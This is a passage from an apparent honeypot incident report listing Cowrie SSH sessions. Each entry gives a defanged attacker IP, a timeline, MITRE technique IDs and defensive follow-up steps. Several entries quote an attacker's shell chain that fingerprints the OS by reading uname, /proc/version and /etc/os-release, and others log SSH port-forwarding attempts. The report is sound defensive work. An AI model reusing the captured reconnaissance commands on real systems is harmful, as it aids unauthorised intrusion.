| `2026-07-10 17:16:45` | `cowrie.command.success` |
| `2026-07-10 17:16:45` | `cowrie.command.input` |
| `2026-07-10 17:16:45` | `cowrie.command.input` |
| `2026-07-10 17:16:45` | `cowrie.command.input` |
| `2026-07-10 17:16:45` | `cowrie.command.input` |
| `2026-07-10 17:16:46` | `cowrie.log.closed` |
| `2026-07-10 17:16:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab9c6941f6f7

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-10 17:18 |
| **Last Seen** | 2026-07-10 17:18 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:18:53` | `cowrie.session.connect` |
| `2026-07-10 17:18:53` | `cowrie.client.version` |
| `2026-07-10 17:18:53` | `cowrie.client.kex` |
| `2026-07-10 17:18:54` | `cowrie.login.success` |
| `2026-07-10 17:18:55` | `cowrie.session.params` |
| `2026-07-10 17:18:55` | `cowrie.command.input` |
| `2026-07-10 17:18:55` | `cowrie.command.input` |
| `2026-07-10 17:18:55` | `cowrie.command.input` |
| `2026-07-10 17:18:55` | `cowrie.command.input` |
| `2026-07-10 17:18:55` | `cowrie.command.input` |
| `2026-07-10 17:18:55` | `cowrie.command.success` |
| `2026-07-10 17:18:55` | `cowrie.command.input` |
| `2026-07-10 17:18:55` | `cowrie.command.input` |
| `2026-07-10 17:18:55` | `cowrie.command.input` |
| `2026-07-10 17:18:55` | `cowrie.command.input` |
| `2026-07-10 17:18:55` | `cowrie.log.closed` |
| `2026-07-10 17:18:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e567fce8c4db

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-10 17:20 |
| **Last Seen** | 2026-07-10 17:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:20:55` | `cowrie.session.connect` |
| `2026-07-10 17:20:55` | `cowrie.client.version` |
| `2026-07-10 17:20:55` | `cowrie.client.kex` |
| `2026-07-10 17:20:57` | `cowrie.login.success` |
| `2026-07-10 17:20:58` | `cowrie.session.params` |
| `2026-07-10 17:20:58` | `cowrie.command.input` |
| `2026-07-10 17:20:58` | `cowrie.command.input` |
| `2026-07-10 17:20:58` | `cowrie.command.input` |
| `2026-07-10 17:20:58` | `cowrie.command.input` |
| `2026-07-10 17:20:58` | `cowrie.command.input` |
| `2026-07-10 17:20:58` | `cowrie.command.success` |
| `2026-07-10 17:20:58` | `cowrie.command.input` |
| `2026-07-10 17:20:58` | `cowrie.command.input` |
| `2026-07-10 17:20:58` | `cowrie.command.input` |
| `2026-07-10 17:20:58` | `cowrie.command.input` |
| `2026-07-10 17:20:58` | `cowrie.log.closed` |
| `2026-07-10 17:20:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b39a1348581

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-10 17:22 |
| **Last Seen** | 2026-07-10 17:22 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:22:56` | `cowrie.session.connect` |
| `2026-07-10 17:22:56` | `cowrie.client.version` |
| `2026-07-10 17:22:56` | `cowrie.client.kex` |
| `2026-07-10 17:22:58` | `cowrie.login.success` |
| `2026-07-10 17:22:59` | `cowrie.session.params` |
| `2026-07-10 17:22:59` | `cowrie.command.input` |
| `2026-07-10 17:22:59` | `cowrie.command.input` |
| `2026-07-10 17:22:59` | `cowrie.command.input` |
| `2026-07-10 17:22:59` | `cowrie.command.input` |
| `2026-07-10 17:22:59` | `cowrie.command.input` |
| `2026-07-10 17:22:59` | `cowrie.command.success` |
| `2026-07-10 17:22:59` | `cowrie.command.input` |
| `2026-07-10 17:22:59` | `cowrie.command.input` |
| `2026-07-10 17:22:59` | `cowrie.command.input` |
| `2026-07-10 17:22:59` | `cowrie.command.input` |
| `2026-07-10 17:22:59` | `cowrie.log.closed` |
| `2026-07-10 17:22:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05bda71a52f0

| Field | Detail |
|---|---|
| **Source IP** | `51.116.117[.]203` |
| **First Seen** | 2026-07-10 17:23 |
| **Last Seen** | 2026-07-10 17:23 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:23:01` | `cowrie.session.connect` |
| `2026-07-10 17:23:02` | `cowrie.client.version` |
| `2026-07-10 17:23:02` | `cowrie.client.kex` |
| `2026-07-10 17:23:02` | `cowrie.login.success` |
| `2026-07-10 17:23:02` | `cowrie.direct-tcpip.request` |
| `2026-07-10 17:23:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.116.117[.]203` to AbuseIPDB if not already reported
- [ ] Block `51.116.117[.]203` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18c9f20a0f8f

| Field | Detail |
|---|---|
| **Source IP** | `49.124.153[.]44` |
| **First Seen** | 2026-07-10 17:23 |
| **Last Seen** | 2026-07-10 17:23 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:23:13` | `cowrie.session.connect` |
| `2026-07-10 17:23:14` | `cowrie.client.version` |
| `2026-07-10 17:23:14` | `cowrie.client.kex` |
| `2026-07-10 17:23:16` | `cowrie.login.success` |
| `2026-07-10 17:23:16` | `cowrie.direct-tcpip.request` |
| `2026-07-10 17:23:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.153[.]44` to AbuseIPDB if not already reported
- [ ] Block `49.124.153[.]44` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd1b9b1b1491

| Field | Detail |
|---|---|
| **Source IP** | `182.75.197[.]174` |
| **First Seen** | 2026-07-10 17:23 |
| **Last Seen** | 2026-07-10 17:23 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:23:14` | `cowrie.session.connect` |
| `2026-07-10 17:23:15` | `cowrie.client.version` |
| `2026-07-10 17:23:15` | `cowrie.client.kex` |
| `2026-07-10 17:23:18` | `cowrie.login.success` |
| `2026-07-10 17:23:19` | `cowrie.direct-tcpip.request` |
| `2026-07-10 17:23:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.75.197[.]174` to AbuseIPDB if not already reported
- [ ] Block `182.75.197[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eba1d7042f3c

| Field | Detail |
|---|---|
| **Source IP** | `91.219.196[.]17` |
| **First Seen** | 2026-07-10 17:23 |
| **Last Seen** | 2026-07-10 17:23 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:23:24` | `cowrie.session.connect` |
| `2026-07-10 17:23:25` | `cowrie.client.version` |
| `2026-07-10 17:23:25` | `cowrie.client.kex` |
| `2026-07-10 17:23:26` | `cowrie.login.success` |
| `2026-07-10 17:23:26` | `cowrie.direct-tcpip.request` |
| `2026-07-10 17:23:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.219.196[.]17` to AbuseIPDB if not already reported
- [ ] Block `91.219.196[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-111e6ca66e5c

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-10 17:23 |
| **Last Seen** | 2026-07-10 17:23 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:23:42` | `cowrie.session.connect` |
| `2026-07-10 17:23:43` | `cowrie.client.version` |
| `2026-07-10 17:23:43` | `cowrie.client.kex` |
| `2026-07-10 17:23:46` | `cowrie.login.success` |
| `2026-07-10 17:23:48` | `cowrie.session.params` |
| `2026-07-10 17:23:48` | `cowrie.command.input` |
| `2026-07-10 17:23:48` | `cowrie.log.closed` |
| `2026-07-10 17:23:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69b6c38dc2a9

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-10 17:24 |
| **Last Seen** | 2026-07-10 17:24 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:24:55` | `cowrie.session.connect` |
| `2026-07-10 17:24:55` | `cowrie.client.version` |
| `2026-07-10 17:24:55` | `cowrie.client.kex` |
| `2026-07-10 17:24:57` | `cowrie.login.success` |
| `2026-07-10 17:24:58` | `cowrie.session.params` |
| `2026-07-10 17:24:58` | `cowrie.command.input` |
| `2026-07-10 17:24:58` | `cowrie.command.input` |
| `2026-07-10 17:24:58` | `cowrie.command.input` |
| `2026-07-10 17:24:58` | `cowrie.command.input` |
| `2026-07-10 17:24:58` | `cowrie.command.input` |
| `2026-07-10 17:24:58` | `cowrie.command.success` |
| `2026-07-10 17:24:58` | `cowrie.command.input` |
| `2026-07-10 17:24:58` | `cowrie.command.input` |
| `2026-07-10 17:24:58` | `cowrie.command.input` |
| `2026-07-10 17:24:58` | `cowrie.command.input` |
| `2026-07-10 17:24:58` | `cowrie.log.closed` |
| `2026-07-10 17:24:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e0bfc3b083b

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]57` |
| **First Seen** | 2026-07-10 17:26 |
| **Last Seen** | 2026-07-10 17:26 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:26:42` | `cowrie.session.connect` |
| `2026-07-10 17:26:43` | `cowrie.client.version` |
| `2026-07-10 17:26:43` | `cowrie.client.kex` |
| `2026-07-10 17:26:44` | `cowrie.login.success` |
| `2026-07-10 17:26:44` | `cowrie.direct-tcpip.request` |
| `2026-07-10 17:26:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]57` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]57` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c13e173426f7

| Field | Detail |
|---|---|
| **Source IP** | `221.120.4[.]61` |
| **First Seen** | 2026-07-10 17:26 |
| **Last Seen** | 2026-07-10 17:27 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:26:50` | `cowrie.session.connect` |
| `2026-07-10 17:26:50` | `cowrie.client.version` |
| `2026-07-10 17:26:50` | `cowrie.client.kex` |
| `2026-07-10 17:26:54` | `cowrie.login.success` |
| `2026-07-10 17:26:55` | `cowrie.direct-tcpip.request` |
| `2026-07-10 17:27:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.120.4[.]61` to AbuseIPDB if not already reported
- [ ] Block `221.120.4[.]61` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c351de566b4

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-10 17:26 |
| **Last Seen** | 2026-07-10 17:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:26:59` | `cowrie.session.connect` |
| `2026-07-10 17:26:59` | `cowrie.client.version` |
| `2026-07-10 17:26:59` | `cowrie.client.kex` |
| `2026-07-10 17:27:01` | `cowrie.login.success` |
| `2026-07-10 17:27:03` | `cowrie.session.params` |
| `2026-07-10 17:27:03` | `cowrie.command.input` |
| `2026-07-10 17:27:03` | `cowrie.command.input` |
| `2026-07-10 17:27:03` | `cowrie.command.input` |
| `2026-07-10 17:27:03` | `cowrie.command.input` |
| `2026-07-10 17:27:03` | `cowrie.command.input` |
| `2026-07-10 17:27:03` | `cowrie.command.success` |
| `2026-07-10 17:27:03` | `cowrie.command.input` |
| `2026-07-10 17:27:03` | `cowrie.command.input` |
| `2026-07-10 17:27:03` | `cowrie.command.input` |
| `2026-07-10 17:27:03` | `cowrie.command.input` |
| `2026-07-10 17:27:03` | `cowrie.log.closed` |
| `2026-07-10 17:27:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c517caf53067

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-10 17:28 |
| **Last Seen** | 2026-07-10 17:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:28:59` | `cowrie.session.connect` |
| `2026-07-10 17:28:59` | `cowrie.client.version` |
| `2026-07-10 17:28:59` | `cowrie.client.kex` |
| `2026-07-10 17:29:00` | `cowrie.login.success` |
| `2026-07-10 17:29:01` | `cowrie.session.params` |
| `2026-07-10 17:29:01` | `cowrie.command.input` |
| `2026-07-10 17:29:01` | `cowrie.command.input` |
| `2026-07-10 17:29:01` | `cowrie.command.input` |
| `2026-07-10 17:29:01` | `cowrie.command.input` |
| `2026-07-10 17:29:01` | `cowrie.command.input` |
| `2026-07-10 17:29:01` | `cowrie.command.success` |
| `2026-07-10 17:29:01` | `cowrie.command.input` |
| `2026-07-10 17:29:01` | `cowrie.command.input` |
| `2026-07-10 17:29:01` | `cowrie.command.input` |
| `2026-07-10 17:29:01` | `cowrie.command.input` |
| `2026-07-10 17:29:02` | `cowrie.log.closed` |
| `2026-07-10 17:29:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2cd71641295

| Field | Detail |
|---|---|
| **Source IP** | `64.89.161[.]90` |
| **First Seen** | 2026-07-10 17:30 |
| **Last Seen** | 2026-07-10 17:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:30:27` | `cowrie.session.connect` |
| `2026-07-10 17:30:27` | `cowrie.client.version` |
| `2026-07-10 17:30:27` | `cowrie.client.kex` |
| `2026-07-10 17:30:28` | `cowrie.login.success` |
| `2026-07-10 17:30:28` | `cowrie.direct-tcpip.request` |
| `2026-07-10 17:30:28` | `cowrie.direct-tcpip.data` |
| `2026-07-10 17:30:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.89.161[.]90` to AbuseIPDB if not already reported
- [ ] Block `64.89.161[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d517be09b002

| Field | Detail |
|---|---|
| **Source IP** | `64.89.161[.]90` |
| **First Seen** | 2026-07-10 17:30 |
| **Last Seen** | 2026-07-10 17:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:30:31` | `cowrie.session.connect` |
| `2026-07-10 17:30:31` | `cowrie.client.version` |
| `2026-07-10 17:30:31` | `cowrie.client.kex` |
| `2026-07-10 17:30:31` | `cowrie.login.success` |
| `2026-07-10 17:30:31` | `cowrie.direct-tcpip.request` |
| `2026-07-10 17:30:31` | `cowrie.direct-tcpip.data` |
| `2026-07-10 17:30:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.89.161[.]90` to AbuseIPDB if not already reported
- [ ] Block `64.89.161[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46a9c09a60df

| Field | Detail |
|---|---|
| **Source IP** | `64.89.161[.]90` |
| **First Seen** | 2026-07-10 17:30 |
| **Last Seen** | 2026-07-10 17:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:30:43` | `cowrie.session.connect` |
| `2026-07-10 17:30:43` | `cowrie.client.version` |
| `2026-07-10 17:30:43` | `cowrie.client.kex` |
| `2026-07-10 17:30:44` | `cowrie.login.success` |
| `2026-07-10 17:30:44` | `cowrie.direct-tcpip.request` |
| `2026-07-10 17:30:44` | `cowrie.direct-tcpip.data` |
| `2026-07-10 17:30:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.89.161[.]90` to AbuseIPDB if not already reported
- [ ] Block `64.89.161[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffb1f7490ba6

| Field | Detail |
|---|---|
| **Source IP** | `64.89.161[.]90` |
| **First Seen** | 2026-07-10 17:30 |
| **Last Seen** | 2026-07-10 17:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:30:47` | `cowrie.session.connect` |
| `2026-07-10 17:30:47` | `cowrie.client.version` |
| `2026-07-10 17:30:48` | `cowrie.client.kex` |
| `2026-07-10 17:30:48` | `cowrie.login.success` |
| `2026-07-10 17:30:48` | `cowrie.direct-tcpip.request` |
| `2026-07-10 17:30:48` | `cowrie.direct-tcpip.data` |
| `2026-07-10 17:30:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.89.161[.]90` to AbuseIPDB if not already reported
- [ ] Block `64.89.161[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb7311c2edb7

| Field | Detail |
|---|---|
| **Source IP** | `103.174.80[.]40` |
| **First Seen** | 2026-07-10 17:30 |
| **Last Seen** | 2026-07-10 17:31 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:30:55` | `cowrie.session.connect` |
| `2026-07-10 17:30:56` | `cowrie.client.version` |
| `2026-07-10 17:30:56` | `cowrie.client.kex` |
| `2026-07-10 17:30:58` | `cowrie.login.success` |
| `2026-07-10 17:30:59` | `cowrie.direct-tcpip.request` |
| `2026-07-10 17:31:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.174.80[.]40` to AbuseIPDB if not already reported
- [ ] Block `103.174.80[.]40` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62bb85363cdb

| Field | Detail |
|---|---|
| **Source IP** | `64.89.161[.]90` |
